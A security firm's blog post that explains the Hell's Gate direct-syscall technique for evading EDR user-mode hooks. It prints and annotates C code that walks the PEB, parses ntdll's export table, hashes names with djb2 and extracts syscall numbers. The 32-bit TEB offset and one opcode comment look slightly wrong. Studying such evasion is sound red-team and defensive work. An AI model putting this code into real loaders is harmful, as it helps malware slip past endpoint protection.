<html lang="en"><head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        


<title>
    Exploring Hell's Gate - RedOps - English
</title>
<meta name="referrer" content="origin-when-cross-origin">
<meta name="description" content="">

<meta property="fb:app_id" content="">
<meta property="og:url" content="https://redops.at/en/blog/exploring-hells-gate">
<meta property="og:type" content="website">
<meta property="og:title" content="Exploring Hell's Gate - RedOps">
<meta property="og:image" content="https://redops.at/assets/images//transforms/blog/_1200x630_crop_center-center_none/Hells_Gate.jpg">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:description" content="">
<meta property="og:site_name" content="RedOps - English">
<meta property="og:locale" content="en">
<meta property="og:locale:alternate" content="de_AT">
<meta property="og:locale:alternate" content="en">

<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="">
<meta name="twitter:url" content="https://redops.at/en/blog/exploring-hells-gate">
<meta name="twitter:title" content="Exploring Hell's Gate - RedOps">
<meta name="twitter:description" content="">
<meta name="twitter:image" content="https://redops.at/assets/images//transforms/blog/_1200x600_crop_center-center_none/Hells_Gate.jpg">


<link rel="home" href="https://redops.at/en/">
<link rel="canonical" href="https://redops.at/en/en/blog/exploring-hells-gate">

                                    <link rel="alternate" href="https://redops.at/blog/exploring-hells-gate" hreflang="de-AT" type="text/html">
                    
        <link rel="shortcut icon" type="image/x-icon" href="/favicon.svg">
        <link rel="stylesheet" href="https://redops.at/dist/assets/css-CLotB-bN.css">

            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" integrity="sha512-vswe+cgvic/XBoF1OcM/TeJ2FW0OofqAVdCZiEYkd6dwGXthvkSFWOoGGJgS2CW70VK5dQM5Oh+7ne47s74VTg==" crossorigin="anonymous" referrerpolicy="no-referrer">

                    <script defer="" data-domain="redops.at" src="https://plausible.io/js/plausible.js"></script>
            </head>
    <body id="Main">
        <header id="Header">
            
<div class="header dark">
        <a href="https://redops.at/en/" class="title fade-in instant-on">Homepage</a>
    <div class="language-switcher">
                                                                                                                                    <a href="https://redops.at/blog/exploring-hells-gate" class="language-link ">DE</a>
                                            <div class="language-divider  active">/</div>
                                                                                                                                        <a href="https://redops.at/en/blog/exploring-hells-gate" class="language-link active">EN</a>
            </div>    <button type="button" class="nav-toggle close">
        Navigation Menu
        <div class="top-line"></div>
        <div class="bottom-line"></div>
    </button>
</div>
<nav class="nav">
    <div class="nav-content container">
        <ul class="nav-list">
            <li class="nav-item">
                <a href="https://redops.at/en/" class="nav-link glitch" data-content="Home">
                    Home
                </a>
            </li>
                                        <li class="nav-item">
                    <a href="https://redops.at/en/about-us" class="nav-link glitch" data-content="About Us">
                        About Us
                    </a>
                </li>
                                                    <li class="nav-item">
                    <a href="https://redops.at/en/knowledge-base" class="nav-link glitch" data-content="Knowledge Base">
                        Knowledge Base
                    </a>
                </li>
                                                    <li class="nav-item">
                    <a href="https://redops.at/en/kontakt" class="nav-link glitch" data-content="Contact">
                        Contact
                    </a>
                </li>
                                </ul>
        <ul class="nav-list expertise">
                                        <li class="nav-item">
                    <a href="https://redops.at/en/expertise" class="nav-link glitch" data-content="Services">
                        Services
                    </a>
                </li>
                                                    <li class="nav-item">
                    <a href="https://redops.at/en/expertise/penetration-testing" class="nav-link glitch small" data-content="Penetration Test">
                        Penetration Test
                    </a>
                </li>
                            <li class="nav-item">
                    <a href="https://redops.at/en/expertise/assumed-breach" class="nav-link glitch small" data-content="Assumed Breach">
                        Assumed Breach
                    </a>
                </li>
                            <li class="nav-item">
                    <a href="https://redops.at/en/expertise/red-team-engagement" class="nav-link glitch small" data-content="Red Teaming">
                        Red Teaming
                    </a>
                </li>
                            <li class="nav-item">
                    <a href="https://redops.at/en/expertise/training" class="nav-link glitch small" data-content="Workshops">
                        Workshops
                    </a>
                </li>
                    </ul>
        <div class="contact">
            <div class="heading">
                Contact
            </div>
            <div class="address">
                FÃ¶hrenweg 5, A-6065 Thaur
            </div>
            <a href="tel:+43-660-4765788" class="phone" data-plausible-event="click:phone">
                +43 660 4765788
            </a>
            <a href="mailto:office@redops.at" class="email" data-plausible-event="click:email" data-plausible-props="navigation">
                office@redops.at
            </a>
        </div>
    </div>
</nav>
        </header>
        <main>
                    <div class="blog-page">
        <div class="page-intro">
            <a class="back" href="https://redops.at/en/knowledge-base">Previous</a>
            <div class="content container">
                <h1 class="h1">
                    Exploring Hell's Gate
                </h1>
                <div class="blog-text-section">
                    <p><strong>TL;DR:</strong> To bypass user mode hooks implemented by Endpoint Detection and Response (EDR) systems, attackers (specifically red teams) employ various techniques for unhooking or bypassing these safeguards. The focus here is on the Hell's Gate Proof of Concept (POC), an approach that utilizes direct syscalls to bypass user mode hooks. Even though Hell's Gate POC has been around for a few years, it remains pivotal in the evolution of direct syscalls.<br><br>One key issue that Hell's Gate solves is the avoidance of hardcoded System Service Numbers (SSNs), also known as syscall IDs, in direct syscall POCs. Instead, it allows for the dynamic retrieval of SSNs from native functions within the ntdll.dll at runtime. This is crucial as SSNs can change between different versions of Windows, and in a realistic scenario or during a red team engagement, the target's specific Windows version is often unknown. Thus, hardcoding SSNs poses a risk and could lead to failure in the attack, a problem effectively addressed by the Hell's Gate technique.</p>
                </div>
                                                <ul class="tags">
                                            <li>
                            <a class="tag glitch dark" href="https://redops.at/en/knowledge-base&amp;filter=Malware Development" data-content="Malware Development">
                                Malware Development
                            </a>
                        </li>
                                            <li>
                            <a class="tag glitch dark" href="https://redops.at/en/knowledge-base&amp;filter=EDR Evasion" data-content="EDR Evasion">
                                EDR Evasion
                            </a>
                        </li>
                                    </ul>
            </div>
            <div class="share">
                <div class="share-button">
    Share
    <div class="buttons">
        <a class="social-button twitter" href="https://twitter.com/intent/tweet?text=https://redops.at/en/blog/exploring-hells-gate" target="_blank" data-plausible-event="click:share" data-plausible-props="twitter">
            Tweet
        </a>
        <a class="social-button linkedin" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fredops.at%2Fen%2Fblog%2Fexploring-hells-gate" target="_blank" data-plausible-event="click:share" data-plausible-props="linkedin">
            Post on LinkedIn
        </a>
        <a class="social-button facebook" href="https://www.facebook.com/sharer.php?u=https://redops.at/en/blog/exploring-hells-gate" target="_blank" data-plausible-event="click:share" data-plausible-props="facebook">
            Share on Facebook
        </a>
        <a class="social-button reddit" href="https://reddit.com/submit?url=https://redops.at/en/blog/exploring-hells-gate&amp;title=Exploring Hell's Gate" target="_blank" data-plausible-event="click:share" data-plausible-props="reddit">
            Share on Reddit
        </a>
    </div>
</div>
            </div>
        </div>
        <div class="blog-content">
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <h3>Disclaimer<br></h3>
<p>There is a great <a href="https://github.com/am0nsec/HellsGate/blob/master/hells-gate.pdf" target="_blank" rel="noreferrer noopener">paper</a> by Hell's Gate founders am0nsec and RtlMateusz. But as always, the best way for me to learn about a topic is to dig deep into it and make a presentation or write a blog post. I'm not making any claims, I'm just trying to understand Hell's Gate and share it with the infosec community. The <code>Hell's Gate</code> POC can be found <a href="https://github.com/am0nsec/HellsGate/tree/master" target="_blank" rel="noreferrer noopener">here</a>.</p>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <h3>Introduction</h3>
<p>To avoid user mode hooks from EDRs, an attacker (red team) can use several techniques to get rid of user mode hooks by unhooking or bypassing user mode hooks using direct or indirect syscalls. In this blog post I will focus on the <code>Hell's Gate</code> POC, which uses direct syscalls to bypass user mode hooks. Although the POC is a few years old, in my opinion it was one of the most important steps or POCs in the evolution of direct syscalls in the past. Also, I want to understand the code better, so reason enough to take a closer look at it.</p>
<p>In general, why was Hell's Gate introduced, or what problem does it solve? Instead of hardcoding <code>System Service Numbers</code> (SSN) or syscall IDs into a direct syscall POC, the Hell's Gate technique allows us to dynamically retrieve <code>SSNs</code> from native functions at runtime from <code>ntdll.dll</code>. But why do we need this? The reason is simple: <code>SSNs</code> can vary from Windows to Windows or version to version, and in a real-world scenario or red team engagement, we usually do not know what Windows or version the target is running. Therefore, hardcoding the <code>SSNs</code> could be risky and fail. </p>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <h3>Dynamic retrieval of SSNs</h3>
<p>Regardless of whether we use a direct or indirect syscall shellcode loader, if we do not want to hardcode the&nbsp;<code>SSNs</code>&nbsp;from the native functions we use in our loader, we need to find a way to dynamically retrieve the&nbsp;<code>SSNs</code>&nbsp;from&nbsp;<code>ntdll.dll</code>&nbsp;at runtime.&nbsp;To achieve this, we can use several different techniques, as shown in the following examples.</p>
<ul><li>Using&nbsp;<code>GetModuleHandleA</code>&nbsp;and&nbsp;<code>GetProcAddress</code></li><li><code>PEB</code>&nbsp;walk combined with&nbsp;<code>EAT</code>&nbsp;parsing</li><li>Build your own&nbsp;<code>GetModuleHandleA</code>&nbsp;and&nbsp;<code>GetProcAddress</code>&nbsp;functions</li></ul>
<p></p>
<p>I think the simplest technique in this case is to open a handle to&nbsp;<code>ntdll.dll</code>&nbsp;by using&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea" target="_blank" rel="noreferrer noopener">GetModuleHandleA</a>&nbsp;to get the base address of&nbsp;<code>ntdll.dll</code>. Then use&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress" target="_blank" rel="noreferrer noopener">GetProcAddress</a>&nbsp;to get the memory address of a native function in&nbsp;<code>ntdll.dll</code>, e.g.&nbsp;<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory" target="_blank" rel="noreferrer noopener">NtAllocateVirtualMemory</a>. However, from an opsec perspective, this is not really recommended, because if&nbsp;<code>GetModuleHandleA</code>&nbsp;and/or&nbsp;<code>GetProcAddress</code>&nbsp;is hooked by the EDR, you will be caught. Therefore, among other things, we are going to take a closer look at how <code>SSN</code> retrieval is done in Hell's Gate by going through the <code>PEB</code> and the <code>EAT</code> parsing.</p>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <h3>Hell's Gate in a nutshell</h3>
<p>In short, based on various defined structures, functions etc., Hell's Gate makes it possible to execute direct syscalls based on dynamically retrieving the required&nbsp;<code>SSNs</code>&nbsp;via a combination of walking the&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb" target="_blank" rel="noreferrer noopener">Process Environment Block</a>&nbsp;(PEB), parsing the&nbsp;<code>Export Address Table</code>&nbsp;(EAT) from&nbsp;<code>ntdll.dll</code>, opcode comparison from the syscall stub of the native functions and extracting the&nbsp;<code>SSNs</code>. The main steps can be briefly described as follows.<br></p>
<ul><li>The first step is to access to the&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/debug/thread-environment-block--debugging-notes-" target="_blank" rel="noreferrer noopener">Thread Environment Block</a>&nbsp;(TEB)</li><li>From there, access the&nbsp;<code>PEB</code></li><li>Go through the&nbsp;<code>PEB</code>&nbsp;and get the base address from&nbsp;<code>ntdll.dll</code></li><li>Access the&nbsp;<code>EAT</code>&nbsp;from&nbsp;<code>ntdll.dll</code></li><li>Use&nbsp;<code>djb2</code>&nbsp;hashing on all native functions in the code</li><li>Hash the function names retrieved from&nbsp;<code>EAT</code>&nbsp;using the&nbsp;<code>djb2</code>&nbsp;algorithm</li><li>Compare the hashed function names with the hashed entries in&nbsp;<code>EAT</code></li><li>If they match, store the function address in&nbsp;<code>VX_TABLE</code>&nbsp;as&nbsp;<code>VX_TABLE_ENTRY</code>.</li><li>Based on the (absolut)&nbsp;<code>function address</code>, do an opcode comparison of the&nbsp;<code>syscall stub</code>&nbsp;from the native functions in ntdll.dll&nbsp;to check if the function is hooked or not.</li><li>Additionally, based on checking the opcodes for the&nbsp;<code>syscall</code>&nbsp;and&nbsp;<code>return</code>&nbsp;instruction, check if they are not too far apart to avoid executing a wrong native function or syscall.</li><li>Use the&nbsp;<code>HellsGate</code>&nbsp;function to prepare the execution of a direct syscall.</li><li>Use the&nbsp;<code>HellDescent</code>&nbsp;function to proceed the execution of a direct syscall<br></li></ul>
<p></p>
<p>To get a better understanding of the Hell's Gate POC in detail, we will break it down and take a closer look at it. We will start by having a look at the manually defined structures.</p>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <h3>Hell's Gate Structures</h3>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_VX_TABLE_ENTRY</span> <span class="token punctuation">{</span>
	PVOID   pAddress<span class="token punctuation">;</span>
	DWORD64 dwHash<span class="token punctuation">;</span>
	WORD    wSystemCall<span class="token punctuation">;</span>
<span class="token punctuation">}</span> VX_TABLE_ENTRY<span class="token punctuation">,</span> <span class="token operator">*</span> PVX_TABLE_ENTRY<span class="token punctuation">;</span></code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>Starting at the top of the code, we can identify two defined structures called&nbsp;<code>_VX_TABLE_ENTRY</code>&nbsp;and&nbsp;<code>_VX_TABLE</code>. The first structure&nbsp;<code>_VX_TABLE_ENTRY</code>&nbsp;contains three different data types and builds the template for the entries in the second structur or table<code>_VX_TABLE</code>.</p>
<ul><li><code>pAddress</code>&nbsp;holds the memory address of a native function e.g.&nbsp;<code>NtAllocateVirtualMemory</code><br></li><li><code>dwHash</code>&nbsp;stores the&nbsp;<code>djb2</code>&nbsp;hash of a function e.g.&nbsp;<code>NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b</code><br></li><li><code>wSystemCall</code>&nbsp;holds the&nbsp;<code>SSN</code>&nbsp;of a native function&nbsp;e.g.&nbsp;<code>NtAllocateVirtualMemory</code></li></ul>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>Based on <code>_VX_TABLE_ENTRY</code>, <code>_VX_TABLE</code> then holds <code>pAddress</code>, <code>dwHash</code> and <code>wSystemCall</code> for each entry in the table, and each entry represents one of four native functions used in Hell's Gate. The <code>_VX_TABLE</code> contains all the necessary data for the preparation and execution of the direct syscalls.</p>
<p>In short, these structures are used to store and organise the data that is later used in the code to execute direct syscalls. This way they can be easily looked up and accessed when they need to be called. The <code>SSNs</code> or syscalls are called directly, not through <code>ntdll.dll</code>, so their <code>function addresses</code> and <code>SSNs</code> need to be stored somewhere, which is what these structures are used for.</p>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <h3>Hell's Gate&nbsp;Functions</h3>
<p>In the next step, Hell's Gate defines different types of functions that will be used in the code. Let us take a closer look at each function.</p>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <h4>RtlGetThreadEnvironmentBlock</h4>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">PTEB RtlGetThreadEnvironmentBlock();</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>The <code>RtlGetThreadEnvironmentBlock()</code> function is used to get a pointer <code>PTEB</code> to the <code>TEB</code> of the current thread, it is a data structure that stores information about the state of the current thread. Later we will see that getting the address from the <code>TEB</code> is necessary to get the address from the <code>PEB</code>.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>It checks the <code>_WIN64</code> macro to determine if the code is being compiled for a 64-bit Windows platform. If it is, then the intrinsic function <code>__readgsqword(0x30)</code> is used to read a quadword (64 bits) from a specific offset (<code>0x30</code>) in the GS segment, which contains the <code>TEB</code> on 64-bit Windows. If the code is compiled for a 32-bit Windows platform (if <code>_WIN64</code> is not defined), then the intrinsic function <code>__readfsdword(0x16)</code> is used instead to read a double word (32 bits) from a different offset (<code>0x16</code>) in the FS segment, which contains the TEB on 32-bit Windows. Both intrinsic functions return a pointer (<code>PTEB</code>) to the <code>TEB</code> which is returned by the <code>RtlGetThreadEnvironmentBlock</code> function.</p>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <h4>GetImageExportDirectory</h4>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>The purpose of the <code>GetImageExportDirectory</code> function is to retrieve the <code>_Image_Export_Directory</code> of a given module. Later, when we look at the main function, we will see that the <code>GetImageExportDirectory</code> function is used to get the address of the <code>_IMAGE_EXPORT_DIRECTORY</code> of the <code>ntdll.dll</code> module.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader-&gt;e_lfanew);
	if (pImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders-&gt;OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>The <code>GetImageExportDirectory</code> function basically parses a module in memory to find and return a pointer to its export directory. This directory is crucial when the code needs to find a function exported by a DLL by name, as it contains all the exported function names and their corresponding relativ virtual addresses (<code>RVA</code>).<br></p>
<p>Specifically, the <code>GetImageExportDirectory</code> function does the following:</p>
<ul><li>To read the <a href="https://en.wikipedia.org/wiki/Portable_Executable" target="_blank" rel="noreferrer noopener">structure</a> of a PE file, we first need to get a pointer <code>pImageDosHeader</code> to the <code>_IMAGE_DOS_HEADER</code>. By checking the <code>e_magic</code> field we make sure that we are really reading a PE file, it's not equal to the expected value, the function will return <code>FALSE</code>, indicating that the PE file is invalid or the provided one.<br><br></li><li>Once we have the address to the <code>_IMAGE_DOS_HEADER</code>, we can access <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32#:~:text=the%20FileAlignment%20member.-,e_lfanew,-member%20of%20IMAGE_DOS_HEADER" target="_blank" rel="noreferrer noopener">e_lfanew</a>, which is a field in the DOS header that contains the file <code>offset</code> to the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32" target="_blank" rel="noreferrer noopener">NT headers</a>. Again, validation is implemented by checking that the <code>_IMAGE_NT_HEADER</code> starts with the <code>Signature</code> field.<br><br></li><li>Finally, access the <code>Export Address Table (EAT)</code>, which is part of the <code>_IMAGE_OPTIONAL_HEADER32</code> and can be accessed via the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32#:~:text=DWORD%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20NumberOfRvaAndSizes%3B%0A%20%20IMAGE_DATA_DIRECTORY-,DataDirectory,-%5BIMAGE_NUMBEROF_DIRECTORY_ENTRIES%5D%3B%0A%7D%20IMAGE_OPTIONAL_HEADER32%2C%20*PIMAGE_OPTIONAL_HEADER32" target="_blank" rel="noreferrer noopener">DataDirectory</a>: The first entry in the <code>DataDirectory</code> (index 0) is the <code>_IMAGE_EXPORT_DIRECTORY</code>, which contains information about the functions from the module, in case of <code>ntdll.dll</code> e.g. <code>NtAllocateVirtualMemory</code>, <code>NtProtectVirtualMemory</code> etc.</li></ul><p></p>
<p>Later we will see that the <code>base address</code> from <code>ntdll.dll</code> and the address from the <code>_IMAGE_EXPORT_DIRECTORY</code> in <code>EAT</code> are needed to access the following three entries in the <code>_IMAGE_EXPORT_DIRECTORY</code>:</p>
<ul><li>AddressOfFunctions</li><li>AddressOfNames</li><li>AddressOfNamesOrdinales</li></ul><p></p>
<p>These in turn are needed to finally get the (absolute) memory address of the native functions, e.g. <code>NtAllocateVirtualMemory</code>. But more on this later.</p>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <h4>djb2 Hashing</h4>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;

	return dwHash;
}</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>The <code>djb2</code> function calculates the <code>djb2 hash</code> for a given string. Why is this function needed? Later we will see that in the context of the <code>GetVxTableEntry</code> function, <code>djb2</code> is used to hash the name of each function in the <code>EAT</code>. These hashes are then compared to the <code>dwHash</code> field of the <code>pVxTableEntry</code> structure. </p>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <h4>GetVxTableEntry</h4>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PVX_TABLE_ENTRY pVxTableEntry
);</code></pre>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNameOrdinals);

	for (WORD cx = 0; cx &lt; pImageExportDirectory-&gt;NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry-&gt;dwHash) {
			pVxTableEntry-&gt;pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f &amp;&amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probably too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, &lt;syscall&gt;
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&amp;&amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&amp;&amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&amp;&amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&amp;&amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&amp;&amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>In short, based on the <code>base address</code> from <code>ntdll.dll</code> and the <code>_IMAGE_EXPORT_DIRECTORY</code>, the <code>GetVxTableEntry</code> function is responsible for calculating the absolute memory address of a native function in memory in <code>ntdll.dll</code>. It is also responsible for checking, based on an opcode comparison or validation, whether the native function is hooked or not. If it is not hooked, it retrieves the <code>SSN</code> and stores it in the appropriate <code>VX_TABLE_ENTRY</code> in the <code>wSystemCall</code> variable. But to better understand this function, let us break it down.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNameOrdinals);

	for (WORD cx = 0; cx &lt; pImageExportDirectory-&gt;NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry-&gt;dwHash) {
			pVxTableEntry-&gt;pAddress = pFunctionAddress;</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>In the first part,&nbsp;<code>GetVxTableEntry</code>&nbsp;creates pointers to the&nbsp;<code>AddressOfFunctions</code>,&nbsp;<code>AddressOfNames</code>&nbsp;and&nbsp;<code>AddressOfNameOrdinals</code>&nbsp;arrays in the&nbsp;<code>_IMAGE_EXPORT_DIRECTORY</code>. These arrays contain the relative virtual address (<code>RVA</code>) of a&nbsp;function, the&nbsp;function name and the&nbsp;function ordinal respectively.</p>
